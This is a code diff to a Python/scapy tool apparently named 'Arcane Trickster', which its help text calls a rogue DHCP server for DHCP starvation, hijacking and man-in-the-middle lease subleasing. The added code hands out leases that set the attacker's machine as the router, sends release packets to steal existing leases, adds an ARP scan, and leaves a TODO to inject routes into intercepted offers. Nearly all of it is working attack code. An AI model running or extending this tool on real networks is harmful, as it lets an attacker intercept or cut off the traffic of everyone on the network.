@@ -1,12 +1,18 @@
 from scapy.all import *
 from threading import Thread, Event
 from queue import Queue, Empty
+from ipaddress import IPv4Network, IPv4Address
 import random
 import time
 import select
 import socket
 import fcntl
-
+import argparse
+arg_parser = argparse.ArgumentParser(
+                    prog='Arcane Trickster',
+                    description="""Rogue DHCP Server: DHCP Starvation, DHCP Hijacking,
+                    Ma\'am-in-the Middle DHCP Subleasing(LANlady)'""",
+                    epilog='Text at the bottom of help')
 import logging
 logging.basicConfig(format='%(asctime)s - %(name)s [%(levelname)s] %(message)s', level=logging.INFO)
 
@@ -20,6 +26,8 @@ class ifreq(ctypes.Structure):
 
 def random_mac():
     mac = random.randint(0, 2**48-1)
+
+    # Set the broadcast bit
     if not mac & 2**40:
         mac ^= 2**40
 
@@ -105,10 +113,10 @@ class NetworkInterface(ThreadedWorker):
     '''
     def __init__(self, name: str) -> None:
         self.name   = name
-        # Create Socket and bind it. Dani what does 0x0800 do here?
+        # Create Socket and bind it
         self.socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
         self.socket.bind((self.name, 0x0800))
-        # Set socket to non-binding to allow for multi-threading without lockup/
+        # Set socket to non-binding to allow for multi-threading without lockup
         self.socket.setblocking(0)
         self.enter_promiscious_mode()
 
@@ -142,6 +150,15 @@ class NetworkInterface(ThreadedWorker):
         Return the scapy IP address 
         '''
         return get_if_addr(self.name)
+
+
+    @property
+    def subnet_mask(self):
+        for net, msk, gw, iface, addr, metric in conf.route.routes:
+            if iface == self.name:
+                network = IPv4Network(f"{ltoa(net)}/{ltoa(msk)}")
+                if IPv4Address(self.ip_address) in network:
+                    return ltoa(msk)
 
 
     def close(self):
@@ -199,12 +216,56 @@ class Subscriber(ThreadedWorker):
 
 
 class DHCPLeaseGenerator(object):
+    def __init__(self) -> None:
+        self.claimed    = {}
+        self.mac_ip_map = {}
+
 
     def renew(self, ip_address: str):
-        raise NotImplementedError
+        if ip_address in self.claimed:
+            old_lease, expiration, mac_address = self.claimed[ip_address]
 
-    def claim(self):
-        raise NotImplementedError
+            # Make sure that they actually have the IP
+            if ip_address == self.mac_ip_map.get(mac_address, "DNE"):
+                if time.time() > expiration:
+                    for lease in reversed(self.leases):
+                        if hash(lease) == hash(old_lease):
+                            logging.debug(f"Renewing lease {repr(lease)}")
+                            old_lease.renew(lease)
+                            return lease
+                else:
+                    return old_lease
+
+        raise DHCPLeaseExpiredException(ip_address)
+
+
+    def claim(self, mac_address: str):
+        for lease in reversed(self.leases):
+            # Release it first if it expired
+            if lease.ip_address in self.claimed:
+                old_lease, expiration, mac_address = self.claimed[lease.ip_address]
+
+                if time.time() > expiration:
+                    self.release(old_lease.ip_address)
+                else:
+                    continue
+
+
+            if lease.is_expired:
+                raise DHCPLeasePoolExhaustedException("Expired lease in renewal list")
+
+            # Handle claims
+            self.claimed[lease.ip_address] = (lease, lease.expiration, mac_address)
+            self.mac_ip_map[mac_address]   = lease.ip_address
+            logging.debug(f"Claiming lease {repr(lease)}")
+            return lease
+
+        raise DHCPLeasePoolExhaustedException
+
+
+    def release(self, ip_address: str=None):
+        logging.debug(f"Releasing lease {repr(ip_address)}")
+        del self.claimed[ip_address]
 
 
 class DHCPLease(object):
@@ -253,7 +314,9 @@ class DHCPLease(object):
         packet    = Ether(dst=dst_mac or self.server_mac, src=self.mac_address, type=0x0800) \
             / IP(src=self.ip_address, dst=dst_ip or self.server_ip) \
             / UDP(dport=dport, sport=sport) \
-            / BOOTP(op=op, secs=secs, chaddr=mac_bytes, xid=xid or random.randint(0, 2**32-1), siaddr=siaddr or '0.0.0.0', ciaddr=ciaddr or '0.0.0.0', yiaddr=yiaddr or '0.0.0.0', flags="B")
+            / BOOTP(op=op, secs=secs, chaddr=mac_bytes, xid=xid or random.randint(0, 2**32-1), 
+                    siaddr=siaddr or '0.0.0.0', ciaddr=ciaddr or '0.0.0.0', yiaddr=yiaddr or '0.0.0.0',
+                    flags="B")
 
         return packet 
 
@@ -275,6 +338,10 @@ class DHCPLease(object):
         return self.build_packet_base(2, xid, dst_mac=dst_mac, dst_ip=dst_ip, siaddr=siaddr, chaddr=dst_mac, yiaddr=yiaddr, ciaddr=ciaddr) / DHCP(options=[("message-type", "ack"), ("server_id", siaddr), *options, ("end")])
 
 
+    def build_nak_packet(self, xid, dst_mac, dst_ip):
+        return self.build_packet_base(2, xid, dst_mac=dst_mac, dst_ip=dst_ip, chaddr=dst_mac) / DHCP(options=[("message-type", "nak"), ("end")])
+
+
     def build_offer_packet(self, xid, dst_mac, dst_ip, siaddr, yiaddr):
         options = [opt for opt in self.options if opt[0] not in ("server_id",)]
         return self.build_packet_base(2, xid, dst_mac=dst_mac, dst_ip=dst_ip, siaddr=siaddr, yiaddr=yiaddr, chaddr=dst_mac) / DHCP(options=[("message-type", "offer"), ("server_id", siaddr), *options, ("end")])
@@ -282,6 +349,7 @@ class DHCPLease(object):
 
     def build_release_packet(self):
         return self.build_packet_base(1) / DHCP(options=[("message-type", "release"), ("end")])
+
 
 
 class DHCPLeaseCollector(ThreadedWorker):
@@ -440,6 +508,33 @@ class DHCPLeaseExpiredException(Exception):
     pass
 
 
+class DHCPRangeLeaser(DHCPLeaseGenerator):
+    def __init__(self, interface: NetworkInterface, ip_address_start: IPv4Address, ip_address_stop: IPv4Address, **options) -> None:
+        self.interface        = interface
+        self.ip_address_start = ip_address_start
+        self.ip_address_stop  = ip_address_stop
+        self.options          = options
+        self.options.update({
+            'router': options.get('router', interface.ip_address),
+            'subnet_mask': options.get('subnet_mask', interface.subnet_mask),
+            'lease_time': options.get('lease_time', 60)
+        })
+        super().__init__()
+
+        lease_range = range(int.from_bytes(self.ip_address_start.packed, 'big'), int.from_bytes(self.ip_address_stop.packed, 'big')+1)
+
+        self._leases = [DHCPLease(random_mac(), str(IPv4Address(ip_int)), interface.mac_address, interface.ip_address, list(self.options.items()), self.options['lease_time']) for ip_int in lease_range]
+
+
+    @property
+    def leases(self):
+        if (self._leases[0].expiration - (self.options['lease_time'] // 2)) < time.time():
+            for lease in self._leases:
+                lease.start_time = time.time()
+        
+        return self._leases
+
+
 class DHCPSubleaser(DHCPLeaseGenerator):
     def __init__(self, interface: NetworkInterface) -> None:
         self.renewer   = DHCPLeaseRenewer(interface, lambda _x,_m,_l: None)
@@ -470,48 +565,13 @@ class DHCPSubleaser(DHCPLeaseGenerator):
             logging.debug(f"Stealing lease {repr(lease)}")
 
             self.interface.send(lease.build_release_packet())
-            
 
 
-    def renew(self, ip_address: str):
-        if ip_address in self.claimed:
-            old_lease = self.claimed[ip_address]
-
-            for lease in reversed(self.renewer.leases):
-                if hash(lease) == hash(old_lease):
-                    logging.debug(f"Renewing lease {repr(lease)}")
-                    self.claimed[ip_address].renew(lease)
-                    return lease
-
-        raise DHCPLeaseExpiredException(ip_address)
 
 
-    def claim(self):
-        for lease in reversed(self.renewer.leases):
-            # Release it first if it expired
-            if lease.ip_address in self.claimed:
-                old_lease = self.claimed[lease.ip_address]
-
-                if old_lease.is_expired:
-                    self.release(old_lease.ip_address)
-                else:
-                    continue
-
-
-            if lease.is_expired:
-                raise DHCPLeasePoolExhaustedException("Expired lease in renewal list")
-
-            # Handle claims
-            self.claimed[lease.ip_address] = lease
-            logging.debug(f"Claiming lease {repr(lease)}")
-            return lease
-        
-        raise DHCPLeasePoolExhaustedException
-
-
-    def release(self, ip_address: str=None):
-        logging.debug(f"Releasing lease {repr(ip_address)}")
-        del self.claimed[ip_address]
+class DHCPLeaseStealer(object):
+    def __init__(self, interface: NetworkInterface) -> None:
+        self.interface = interface
 
 
 
@@ -521,12 +581,15 @@ class DHCPServer(object):
         self.interface       = interface
         self.interface.subscribe(self.handle_packet)
 
+
     def __repr__(self):
         return f"<DHCPServer: interface={self.interface.name}, num_leases={self.num_leases}, num_claimed={len(self.lease_generator.claimed)}>"
-    
+
+
     @property
     def num_leases(self):
         return len(self.lease_generator.leases)
+
 
     def handle_packet(self, packet):
         if DHCP in packet:
@@ -538,45 +601,69 @@ class DHCPServer(object):
 
     def handle_dhcp_discover(self, packet):
         if ("message-type", 1) in packet[DHCP].options:
-            logging.info(f"Handling discover for {packet.src}")
-            # Give them their current IP if we have it
-            if packet[IP].src in self.lease_generator.claimed:
-                lease = self.lease_generator.renew(packet[IP].src)
-            else:
-                lease = self.lease_generator.claim()
+            logging.info(f"Handling DHCPDISCOVER for {packet.src}")
+
+            packet.show()
 
             if packet[IP].src == "0.0.0.0":
                 dst_ip = "255.255.255.255"
+                ip     = self.lease_generator.mac_ip_map.get(packet.src, "DNE")
             else:
                 dst_ip = packet[IP].src
+                ip     = dst_ip
 
 
-            print(packet.src)
-            packet.show()
-            lease.build_offer_packet(xid=packet[BOOTP].xid, dst_ip=dst_ip, dst_mac=packet.src, siaddr=self.interface.ip_address, yiaddr=lease.ip_address).show()
+            # Give them their current IP if we have it
+            if ip in self.lease_generator.claimed:
+                lease = self.lease_generator.renew(ip)
+            else:
+                lease = self.lease_generator.claim(packet.src)
+
+
+            logging.info(f"Offering {lease.ip_address} to {packet.src}")
 
             self.interface.send(lease.build_offer_packet(xid=packet[BOOTP].xid, dst_ip=dst_ip, dst_mac=packet.src, siaddr=self.interface.ip_address, yiaddr=lease.ip_address))
 
 
     def handle_dhcp_request(self, packet):
         if ("message-type", 3) in packet[DHCP].options:
-            logging.info(f"Handling request for {packet.src}")
+            logging.info(f"Handling DHCPREQUEST for {packet.src}")
 
             packet.show()
 
             if packet[IP].src == "0.0.0.0":
-                lease_ip = [opt for opt in packet[DHCP].options if opt[0] == "requested_addr"][0][1]
+                if packet[BOOTP].ciaddr == '0.0.0.0':
+                    lease_ip = [opt for opt in packet[DHCP].options if opt[0] == "requested_addr"][0][1]
+                else:
+                    lease_ip = packet[BOOTP].ciaddr
             else:
                 lease_ip = packet[IP].src
 
-            lease = self.lease_generator.renew(lease_ip)
-            ack = lease.build_ack_packet(xid=packet[BOOTP].xid, dst_ip=packet[IP].src, dst_mac=packet.src, siaddr=self.interface.ip_address, yiaddr=lease.ip_address, ciaddr=packet[BOOTP].ciaddr)
-            ack.show()
-            self.interface.send(ack)
+            try:
+                lease = self.lease_generator.renew(lease_ip)
+                logging.info(f"Sending lease for {lease.ip_address} to {packet.src}")
+                ack = lease.build_ack_packet(xid=packet[BOOTP].xid, dst_ip=packet[IP].src, dst_mac=packet.src, siaddr=self.interface.ip_address, yiaddr=lease.ip_address, ciaddr=packet[BOOTP].ciaddr)
+                ack.show()
+                self.interface.send(ack)
+            except DHCPLeaseExpiredException:
+                logging.info(f"Sending DHCPNAK to {packet.src}")
+                nak = self.lease_generator.leases[0].build_nak_packet(xid=packet[BOOTP].xid, dst_ip=packet[IP].src, dst_mac=packet.src)
+                nak.show()
+                self.interface.send(nak)
 
 
 net_if = NetworkInterface("enp0s3")
-server = DHCPServer(net_if, DHCPSubleaser(net_if))
+#server = DHCPServer(net_if, DHCPSubleaser(net_if))
+server = DHCPServer(net_if, DHCPRangeLeaser(net_if, IPv4Address("10.10.10.10"), IPv4Address("10.10.10.239")))
+
+
+
+def arp_scan(network: IPv4Network):
+    # https://www.geeksforgeeks.org/network-scanning-using-scapy-module-python/
+    request = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=str(network))
+    clients = scapy.srp(request, timeout = 1)[0]
+    return [(c[1].psrc, c[1].hwsrc) for c in clients]
+
 
 
 # TODO Add functionality to intercept a DHCPOFFER and inject our own routes.
